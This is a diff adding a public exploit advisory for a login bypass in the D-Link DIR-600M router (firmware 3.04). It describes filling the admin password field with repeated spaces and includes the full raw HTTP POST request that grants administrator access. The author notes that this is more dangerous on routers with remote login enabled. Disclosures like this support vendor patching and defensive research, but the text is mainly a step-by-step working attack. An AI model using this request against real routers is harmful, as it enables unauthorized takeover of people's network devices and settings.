@@ -1,0 +1,70 @@
+# Exploit Title: D-Link DIR-600M Wireless N 150 Login Page Bypass
+# Date: 19-05-2017
+# Software Link: http://www.dlink.co.in/products/?pid=DIR-600M
+# Exploit Author: Touhid M.Shaikh
+# Vendor : www.dlink.com
+# Contact : http://twitter.com/touhidshaikh22
+# Version: Hardware version: C1
+Firmware version: 3.04
+# Tested on:All Platforms
+
+
+1) Description
+
+After Successfully Connected to D-Link DIR-600M Wireless N 150
+Router(FirmWare Version : 3.04), Any User Can Easily Bypass The Router's
+Admin Panel Just by Feeding Blank Spaces in the password Field.
+
+Its More Dangerous when your Router has a public IP with remote login
+enabled.
+
+For More Details : www.touhidshaikh.com/blog/
+
+IN MY CASE,
+Router IP : http://192.168.100.1
+
+
+
+Video POC : https://www.youtube.com/watch?v=waIJKWCpyNQring
+
+2) Proof of Concept
+
+Step 1: Go to
+Router Login Page : http://192.168.100.1/login.htm
+
+Step 2:
+Fill username: admin
+And in Password Fill more than 20 tims Spaces(" ")
+
+
+
+Our Request Is look like below.
+-----------------ATTACKER REQUEST-----------------------------------
+
+POST /login.cgi HTTP/1.1
+Host: 192.168.100.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
+Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.100.1/login.htm
+Cookie: SessionID=
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+
+username=Admin&password=+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&submit.htm%3Flogin.htm=Send
+
+
+--------------------END here------------------------
+
+Bingooo You got admin Access on router.
+Now you can download/upload settiing, Change setting etc.
+
+
+
+
+-------------------Greetz----------------
+TheTouron(www.thetouron.in), Ronit Yadav
+-----------------------------------------
